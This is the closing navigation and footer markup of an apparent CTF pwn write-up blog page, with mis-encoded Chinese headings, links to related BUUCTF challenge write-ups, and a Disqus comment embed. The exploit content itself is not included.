      <span>ç¼–è¾‘æœ¬é¡µ</span>
    </a>
  </div>




      

      
  <div
    class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"
  >
    <div>
      
        <span class="text-primary-text block font-bold"
          >ä¸Šä¸€é¡µ</span
        >
        <a href="https://peterliuzhi.top/writeup/shell%E9%87%8D%E5%AE%9A%E5%90%91buuctf-wustctf2020_closed/" class="block">ã€shellé‡å®šå‘ã€‘BUUCTF wustctf2020_closed</a>
      
    </div>
    <div class="mt-4 md:mt-0 md:text-right">
      
        <span class="text-primary-text block font-bold">ä¸‹ä¸€é¡µ</span>
        <a href="https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/" class="block">ã€unlinkã€‘BUUCTF hitcontraining_unlink</a>
      
    </div>
  </div>


      



  
<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "peterliuzhi" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>


    </div>
    
      <div class="col-span-2">
        
        
          <div
  class="
    bg-primary-bg
   prose sticky top-16 z-10 hidden px-6 py-4 lg:block"
>
  <h3>æœ¬é¡µå†…å®¹</h3>
</div>
<div
  class="sticky-toc  hidden px-6 pb-6 lg:block"
>
  <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#checksec-æŸ¥çœ‹æ¶æ„">checksec æŸ¥çœ‹æ¶æ„</a></li>
        <li><a href="#ida-æŸ¥çœ‹ç¨‹åºä¼ªä»£ç ">ida æŸ¥çœ‹ç¨‹åºï¼ˆä¼ªï¼‰ä»£ç </a>
          <ul>
            <li><a href="#main-å‡½æ•°">main å‡½æ•°</a></li>
            <li><a href="#åé—¨å‡½æ•°">åé—¨å‡½æ•°</a></li>
          </ul>
        </li>
        <li><a href="#æ„å»º-exp">æ„å»º exp</a>
          <ul>
            <li><a href="#é€šè¿‡åé—¨å‡½æ•°æ„å»º-exp">é€šè¿‡åé—¨å‡½æ•°æ„å»º exp</a>
              <ul>
                <li><a href="#å®Œæ•´-exp1">å®Œæ•´ exp1</a></li>
              </ul>
            </li>
            <li><a href="#é€šè¿‡-syscall-æ„å»º-exp">é€šè¿‡ syscall æ„å»º exp</a>
              <ul>
                <li><a href="#æ²¡æœ‰ç°æˆbinshæ„å»ºå­—ç¬¦ä¸²">æ²¡æœ‰ç°æˆ<code>&quot;/bin/sh&quot;</code>ï¼šæ„å»ºå­—ç¬¦ä¸²</a></li>
                <li><a href="#å®Œæ•´-exp2">å®Œæ•´ exp2</a></li>
                <li><a href="#ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜">ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜</a>
                  <ul>
                    <li><a href="#ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop-edxpop-ecxpop-ebxretåªä½¿ç”¨pop-edxret">ä½œè€…è¯•å›¾ä¸ä½¿ç”¨<code>pop edx;pop ecx;pop ebx;ret</code>åªä½¿ç”¨<code>pop edx;ret</code></a></li>
                    <li><a href="#æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶">æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
</div>
<script>
  window.addEventListener("DOMContentLoaded", () => {
    enableStickyToc();
  });
</script>

        
      </div>
    

    
    
      <div
        class=" bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"
      >
        <h3>ç›¸å…³</h3>
        
          <a href="https://peterliuzhi.top/writeup/jarvisoj_level2_x64/" class="no-underline">BUUCTF Jarvisoj_level2_x64</a>
          <br />
        
          <a href="https://peterliuzhi.top/writeup/ciscn_2019_ne_5/" class="no-underline">BUUCTF ciscn_2019_ne_5</a>
          <br />
        
          <a href="https://peterliuzhi.top/writeup/32%E4%BD%8D%E7%B3%BB%E7%BB%9F%E4%BC%A0%E5%8F%82buuctf-picoctf_2018_rop-chain/" class="no-underline">ã€32ä½ç³»ç»Ÿä¼ å‚ã€‘BUUCTF picoctf_2018_rop chain</a>
          <br />
        
          <a href="https://peterliuzhi.top/writeup/c&#43;&#43;pwnzjctf-2019login/" class="no-underline">ã€C&#43;&#43;Pwnã€‘[ZJCTF 2019]Login</a>
          <br />
        
          <a href="https://peterliuzhi.top/writeup/c%E5%86%85%E5%B5%8C%E6%B1%87%E7%BC%96others_shellcode/" class="no-underline">ã€Cå†…åµŒæ±‡ç¼–ã€‘others_shellcode</a>
          <br />
        
          <a href="https://peterliuzhi.top/writeup/harekazectf2019baby_rop/" class="no-underline">ã€HarekazeCTF2019ã€‘baby_rop</a>
          <br />
        
      </div>
    
  </div>

  
    <script>
      document.addEventListener("DOMContentLoaded", () => {
        hljs.highlightAll();
      });
    </script>

          </div>
        </div>
      
    </main>
    <footer class="pl-scrollbar">
      <div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b">
    <p class="text-sm text-tertiary-text">&copy; 2023 <a href="https://github.com/PeterLiu-all">Peter Liu</a>
 &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
</div>
<link rel="stylesheet" href="https://peterliuzhi.top/css/copy-btn.css">
<script src="https://peterliuzhi.top/js/copy-btn.js"></script></div>
    </footer>
  </body>
</html>
